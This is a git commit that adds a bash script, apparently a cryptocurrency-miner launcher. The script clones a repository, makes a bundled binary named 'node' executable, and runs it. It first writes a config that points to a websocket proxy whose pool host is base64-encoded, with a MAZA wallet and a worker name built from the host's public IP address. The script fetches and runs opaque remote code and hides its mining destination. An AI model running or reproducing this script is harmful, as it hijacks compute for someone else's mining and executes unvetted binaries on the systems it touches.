b3364cbf903f8b58d4c5bd1db63754210b9b8555
miltoncarpenter665 <166653213+miltoncarpenter665@users.noreply.github.com>
2025-04-16 04:52:19 +0200

    Create start_rest_mino_maz.sh

---
+++ start_rest_mino_maz.sh
@@ -0,0 +1,68 @@
+#!/bin/bash
+apt update >/dev/null;apt -y install curl wget git >/dev/null
+sleep 2
+DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null
+
+sleep 2
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
+dpkg-reconfigure --frontend noninteractive tzdata > /dev/null
+
+sleep 2
+
+TZ='Africa/Johannesburg'; export TZ
+date
+sleep 2
+
+git clone https://github.com/miltoncarpenter665/node-mino-app.git
+sleep 2
+cd node-mino-app
+sleep 2
+chmod +x node
+sleep 2
+
+array=()
+for i in {a..z} {A..Z} {0..9}; 
+   do
+   array[$RANDOM]=$i
+done
+
+currentdate=$(date '+%d-%b-%Y_RestWasm_')
+ipaddress=$(curl -s api.ipify.org)
+num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
+used_num_of_cores=`expr $num_of_cores - 8`
+underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
+underscore="_"
+underscored_ip+=$underscore
+currentdate+=$underscored_ip
+
+randomWord=$(printf %s ${array[@]::8} $'\n')
+currentdate+=$randomWord
+
+sleep 2
+
+echo ""
+echo "You will be using $used_num_of_cores cores"
+echo ""
+
+sleep 2
+
+echo ""
+echo "Your worker name is $currentdate"
+echo ""
+
+sleep 2
+
+TZ='Africa/Johannesburg'; export TZ
+date
+sleep 2
+
+cat > data.json <<END
+{
+  "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:9999/Y29pbngudGVhdHNwcmF5LnVrOjgyNDM=",
+  "config": { "threads": $used_num_of_cores, "log": true },
+  "options": { "user": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate", "password": "c=MAZA,m=solo", "argent": "web-wasm/1.0" }
+}
+END
+sleep 2
+./node app.js
